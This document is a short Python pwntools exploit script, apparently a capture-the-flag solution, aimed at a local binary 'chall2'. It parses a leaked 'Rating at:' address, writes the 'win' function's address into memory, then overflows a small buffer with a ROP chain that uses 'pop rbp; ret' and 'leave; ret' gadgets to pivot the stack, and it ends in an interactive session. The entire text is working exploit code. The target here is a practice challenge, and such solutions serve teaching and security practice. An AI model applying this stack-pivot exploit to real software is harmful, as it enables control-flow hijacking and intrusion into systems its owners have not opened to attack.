from pwn import *

def main():
    elf = context.binary = ELF('./chall2')
    rop = ROP(elf)

    p = process(elf.path)
    
    # Gadgets from your binary
    pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
    leave_ret = rop.find_gadget(['leave', 'ret'])[0]
    
    # Step 1: Send first payload and get rating address
    pivot_payload = flat(
        b'A' * 8,            # Fill
        p64(elf.symbols['win'])  # win address at offset 8
    )
    p.sendlineafter(b'scale from 0-9.\n', pivot_payload)
    
    # Parse the leaked address
    leak_line = p.recvline().decode().strip()
    rating_addr = int(leak_line.split('Rating at: ')[1], 16)
    new_stack = rating_addr + 8  # Point to win address
    
    # Step 2: Overflow small_buffer to pivot
    overflow_payload = flat(
        b'C' * 8,            # Fill small_buffer
        p64(new_stack - 8),  # Saved rbp: point to just before win
        p64(pop_rbp),        # Return to pop rbp; ret
        p64(new_stack - 8),  # Set rbp to new stack
        p64(leave_ret)       # Pivot: mov rsp, rbp; pop rbp; ret
    )
    
    # Send the overflow payload
    p.sendlineafter(b'How come?\n', overflow_payload)
    
    p.interactive()

if __name__ == '__main__':
    main()
